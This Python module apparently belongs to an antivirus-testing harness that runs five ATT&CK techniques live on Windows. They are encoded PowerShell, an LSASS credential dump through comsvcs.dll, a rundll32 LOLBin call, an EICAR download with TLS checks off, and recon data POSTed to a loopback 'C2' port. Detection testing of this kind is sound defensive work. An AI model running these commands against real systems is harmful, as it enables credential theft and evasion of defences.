"""
Module 3: ATT&CK Simulation
Phase 3 — 5 real MITRE ATT&CK technique tests designed to be
detected by Windows Defender / AV heuristic / behavioural engines.

Tests run natively on this Windows machine using Python stdlib only
(subprocess, urllib, tempfile, base64, socket) — no external tools.

Techniques:
    T1059.001  PowerShell Execution with encoded IEX payload
    T1003.001  LSASS memory dump via comsvcs.dll (rundll32)
    T1218.011  Signed Binary Proxy — rundll32 JS/HTML injection (LOLBin)
    T1105      Ingress Tool Transfer — EICAR string saved as .exe on disk
    T1082      System Discovery + data-staging / exfil simulation

Config: modules/module_3_atomic/atomic_config.json  (optional)
"""

import os
import sys
import time
import base64
import socket
import tempfile
import subprocess
import urllib.request
import urllib.error
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from base_module import BaseModule
from system_monitor import SystemMonitor


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run_proc(args, timeout=12):
    """
    Run a subprocess and return (returncode, stdout, stderr).
    Returns (-1, '', str(e)) if the process could not be launched
    (which itself indicates AV intervention or a missing binary).
    """
    try:
        proc = subprocess.run(
            args,
            capture_output=True,
            timeout=timeout,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
        )
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return -2, "", "TIMEOUT"
    except (FileNotFoundError, PermissionError, OSError) as e:
        return -1, "", str(e)
    except Exception as e:
        return -1, "", str(e)


def _file_exists_nonempty(path):
    """Return True only if the file exists AND has content."""
    try:
        return os.path.isfile(path) and os.path.getsize(path) > 0
    except OSError:
        return False


def _cleanup(*paths):
    """Best-effort delete of temp files — never raises."""
    for p in paths:
        if p and os.path.isfile(p):
            try:
                os.remove(p)
            except OSError:
                pass


# ---------------------------------------------------------------------------
# Individual ATT&CK test functions
# Each returns  (detected: bool, detail: str)
# ---------------------------------------------------------------------------

def _test_T1059_001():
    """
    T1059.001 — PowerShell Command Execution
    Launches PowerShell with a base64-encoded command that mimics a
    classic 'download-cradle' (IEX + DownloadString pattern).
    Defender's AMSI and script-block logging will flag this.

    Detection: non-zero exit code, 'killed' stdout message,
               or process raising an OS-level exception.
    """
    print("[Atomic] T1059.001 — PowerShell Execution")

    # The payload string mirrors a real-world dropper pattern.
    # It writes a benign EICAR-equivalent marker to a temp file
    # so we have a measurable disk artefact to check.
    marker = tempfile.mktemp(suffix=".txt", prefix="ps_exec_")

    script = (
        f"$c='IEX (New-Object Net.WebClient).DownloadString'; "
        f"$m = \"EICAR-STANDARD-ANTIVIRUS-TEST-FILE\"; "
        f"[System.IO.File]::WriteAllText('{marker}', $m)"
    )
    encoded = base64.b64encode(script.encode("utf-16-le")).decode("ascii")
    args = ["powershell.exe", "-NonInteractive", "-WindowStyle", "Hidden",
            "-EncodedCommand", encoded]

    rc, stdout, stderr = _run_proc(args, timeout=15)

    print(f"[Atomic]   -> rc={rc}  stderr_snippet={stderr[:120]!r}")

    # Detection criteria:
    #   rc == -1  → process could not launch (AV blocked execution)
    #   rc != 0   → PowerShell terminated with error (AMSI/Defender killed it)
    #   marker not written → Defender quarantined artefact mid-script
    marker_ok = _file_exists_nonempty(marker)
    _cleanup(marker)

    if rc == -1 or rc != 0 or not marker_ok:
        return True, f"Blocked (rc={rc}, marker_written={marker_ok})"
    return False, f"PowerShell payload executed (rc={rc}, marker_written={marker_ok})"


def _test_T1003_001():
    """
    T1003.001 — LSASS Memory Dump via comsvcs.dll
    Uses the built-in Windows DLL technique: 
        rundll32.exe comsvcs.dll MiniDump <lsass_pid> <outfile> full
    This is one of the most-detected credential-dumping techniques in
    Defender's behavioural engine.

    Detection: dump file not created (Defender blocked write),
               or process exit code indicates access-denied / error.
    """
    print("[Atomic] T1003.001 — LSASS Memory Dump (comsvcs.dll)")

    # Locate LSASS PID
    lsass_pid = None
    try:
        rc, out, _ = _run_proc(
            ["powershell.exe", "-NonInteractive", "-Command",
             "(Get-Process lsass).Id"], timeout=8
        )
        lsass_pid = int(out.strip()) if rc == 0 and out.strip().isdigit() else None
    except Exception:
        pass

    if lsass_pid is None:
        return True, "Could not resolve LSASS PID (process blocked or AV intervention)"

    dump_path = tempfile.mktemp(suffix=".dmp", prefix="lsass_dump_")
    comsvcs = r"C:\Windows\System32\comsvcs.dll"
    args = [
        "rundll32.exe", comsvcs,
        "MiniDump", str(lsass_pid), dump_path, "full"
    ]

    rc, _, stderr = _run_proc(args, timeout=20)
    print(f"[Atomic]   -> rc={rc}  dump_exists={_file_exists_nonempty(dump_path)}")

    dump_written = _file_exists_nonempty(dump_path)
    _cleanup(dump_path)

    if not dump_written or rc != 0:
        return True, f"Dump blocked (rc={rc}, file_exists={dump_written})"
    return False, f"Dump created (rc={rc}) — AV did not block"


def _test_T1218_011():
    """
    T1218.011 — Signed Binary Proxy via Rundll32 (LOLBin)
    Runs the classic HTML Application trick through rundll32:
        rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";<script>
    Defender heuristics flag both the 'javascript:' URI scheme in
    rundll32 args and the mshtml RunHTMLApplication invocation.

    Detection: non-zero exit code or process launch failure.
    """
    print("[Atomic] T1218.011 — Signed Binary Proxy (Rundll32 LOLBin)")

    js_payload = r'javascript:"\..\mshtml,RunHTMLApplication ";document.write();close()'
    args = ["rundll32.exe", js_payload]

    rc, _, stderr = _run_proc(args, timeout=10)
    print(f"[Atomic]   -> rc={rc}  stderr_snippet={stderr[:120]!r}")

    # On a protected system Defender kills rundll32 or returns non-zero
    if rc != 0 or rc == -1:
        return True, f"rundll32 LOLBin blocked (rc={rc})"
    return False, f"rundll32 LOLBin executed (rc={rc}) — AV did not block"


def _test_T1105():
    """
    T1105 — Ingress Tool Transfer (EICAR as .exe on disk)
    Downloads the official EICAR test string from eicar.org and
    saves it to disk with a .exe extension.  Defender's real-time
    file scanner quarantines the write within milliseconds.

    Detection: file does not exist / is 0 bytes after write.
    """
    print("[Atomic] T1105 — Ingress Tool Transfer (EICAR .exe download)")

    eicar_url = "https://secure.eicar.org/eicar.com.txt"
    out_path   = tempfile.mktemp(suffix=".exe", prefix="eicar_download_")

    try:
        req = urllib.request.Request(
            eicar_url,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        )
        ctx = __import__("ssl").create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = __import__("ssl").CERT_NONE
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            content = resp.read()

        with open(out_path, "wb") as f:
            f.write(content)

        # Brief pause — let real-time scanner react
        time.sleep(2)
        file_ok = _file_exists_nonempty(out_path)
        _cleanup(out_path)

        print(f"[Atomic]   -> EICAR file exists after write: {file_ok}")
        if not file_ok:
            return True, "EICAR .exe quarantined on write (real-time scanner)"
        return False, "EICAR .exe not quarantined — AV did not detect"

    except urllib.error.URLError as e:
        print(f"[Atomic]   -> Network error: {e}")
        # If we can't reach the URL, we can't confirm detection
        return False, f"Network unreachable — test inconclusive ({e})"
    except Exception as e:
        _cleanup(out_path)
        print(f"[Atomic]   -> Exception: {e}")
        return True, f"Write/download blocked by OS/AV: {e}"


def _test_T1082():
    """
    T1082 — System Information Discovery + Exfil Simulation
    Steps (mirrors real attacker tradecraft):
      1. Collect hostname, username, IP, OS via subprocess (systeminfo)
      2. Base64-encode the output (data-staging)
      3. Write encoded blob to a temp .txt file on disk
      4. POST the blob to a local loopback listener (simulated exfil)

    Defender behavioural engine flags the recon→stage→exfil chain.
    Detection: systeminfo command blocked (rc≠0) OR staging file not
               written (Defender quarantine), OR subprocess killed.
    """
    print("[Atomic] T1082 — System Discovery + Exfil Simulation")

    staging_file = tempfile.mktemp(suffix=".txt", prefix="sysinfo_stage_")

    # 1. Recon
    rc, sysinfo_out, _ = _run_proc(
        ["systeminfo"], timeout=20
    )
    discovered = sysinfo_out if rc == 0 and sysinfo_out else ""

    if not discovered:
        # Systeminfo blocked — that itself is a detection signal
        print("[Atomic]   -> systeminfo blocked (rc={rc})")
        return True, f"systeminfo execution blocked (rc={rc})"

    # 2. Stage: base64-encode
    encoded_blob = base64.b64encode(discovered.encode("utf-8", errors="replace")).decode()

    # 3. Write staging file to disk
    try:
        with open(staging_file, "w", encoding="utf-8") as f:
            f.write(encoded_blob)
        time.sleep(1)
        file_written = _file_exists_nonempty(staging_file)
    except (PermissionError, OSError) as e:
        _cleanup(staging_file)
        return True, f"Staging write blocked by AV/OS: {e}"

    print(f"[Atomic]   -> Staging file written: {file_written}  ({staging_file})")

    # 4. Simulated exfil POST to loopback (no real server needed)
    #    We attempt a connection — the loopback will refuse but the
    #    socket syscall itself is what behavioural engines monitor.
    exfil_detected = False
    try:
        # curl to loopback on port 4444 (common C2 port)
        rc2, _, err2 = _run_proc(
            ["powershell.exe", "-NonInteractive", "-Command",
             f"Invoke-WebRequest -Uri 'http://127.0.0.1:4444' "
             f"-Method POST -Body '{encoded_blob[:256]}' -TimeoutSec 3"],
            timeout=8
        )
        print(f"[Atomic]   -> Exfil POST rc={rc2}")
        # A blocked POST (rc≠0) also counts as detection
        if rc2 != 0:
            exfil_detected = True
    except Exception as e:
        print(f"[Atomic]   -> Exfil attempt exception: {e}")

    _cleanup(staging_file)

    # Detection: staging file quarantined OR exfil POST blocked
    if not file_written or exfil_detected:
        return True, f"Staging/exfil chain flagged (file_ok={file_written}, exfil_blocked={exfil_detected})"
    return False, f"Discovery+staging completed without AV block (file_ok={file_written})"


# ---------------------------------------------------------------------------
# Test registry
# ---------------------------------------------------------------------------

TESTS = [
    ("T1059.001", "PowerShell Execution",                    _test_T1059_001),
    ("T1003.001", "LSASS Memory Dump",                       _test_T1003_001),
    ("T1218.011", "Signed Binary Proxy (Rundll32 LOLBin)",   _test_T1218_011),
    ("T1105",     "Ingress Tool Transfer (EICAR .exe)",       _test_T1105),
    ("T1082",     "System Discovery + Exfil Simulation",      _test_T1082),
]


# ---------------------------------------------------------------------------
# Module class
# ---------------------------------------------------------------------------

class AtomicModule(BaseModule):
    """
    Module 3: ATT&CK Simulation
    Runs 5 real MITRE ATT&CK technique tests against the host AV.
    """

    def __init__(self):
        super().__init__()
        self.name        = "Atomic Red Team"
        self.description = ("5 live MITRE ATT&CK technique tests — "
                            "T1059.001, T1003.001, T1218.011, T1105, T1082")
        self.test_results = []

    def get_info(self) -> dict:
        return {
            "id":          self.module_id,
            "name":        self.name,
            "description": self.description,
        }

    # ------------------------------------------------------------------
    # Main run
    # ------------------------------------------------------------------

    def run(self, monitor: SystemMonitor) -> bool:
        start_time = time.time()
        self.status = "Running"
        monitor.start()

        print(f"[Atomic] Starting ATT&CK simulation — {len(TESTS)} tests")
        print("[Atomic] WARNING: Tests WILL trigger AV alerts. This is expected.")
        print()

        any_detected = False

        for tid, tname, func in TESTS:
            print(f"[Atomic] ---- {tid}: {tname} ----")
            t0    = time.time()
            try:
                detected, detail = func()
            except Exception as e:
                detected = True
                detail   = f"Test raised exception (AV likely intervened): {e}"
            elapsed = round(time.time() - t0, 2)

            verdict = "DETECTED" if detected else "NOT DETECTED"
            print(f"[Atomic] Verdict: [{verdict}]  ({elapsed}s)  — {detail}")
            print()

            if detected:
                any_detected = True
                # Signal monitor to record detection timestamp (first detection)
                if not monitor.detection_time:
                    monitor.mark_detection()

            self.test_results.append({
                "test":     f"{tid}  {tname}",
                "tid":      tid,
                "name":     tname,
                "detected": detected,
                "detail":   detail,
                "elapsed":  elapsed,
            })

        monitor.stop()
        self.detected       = any_detected
        self.execution_time = time.time() - start_time
        self.metrics        = monitor.get_results()
        self.status         = "Completed"

        n_det = sum(1 for r in self.test_results if r["detected"])
        print(f"[Atomic] === Simulation complete: {n_det}/{len(TESTS)} tests DETECTED ===")
        return True

    # ------------------------------------------------------------------
    # Results
    # ------------------------------------------------------------------

    def get_results(self) -> dict:
        return {
            "module_id":     self.module_id,
            "name":          self.name,
            "execution_time": round(self.execution_time, 2),
            "status":        self.status,
            "detected":      getattr(self, "detected", False),
            "test_results":  self.test_results,
            "metrics":       self.metrics,
        }
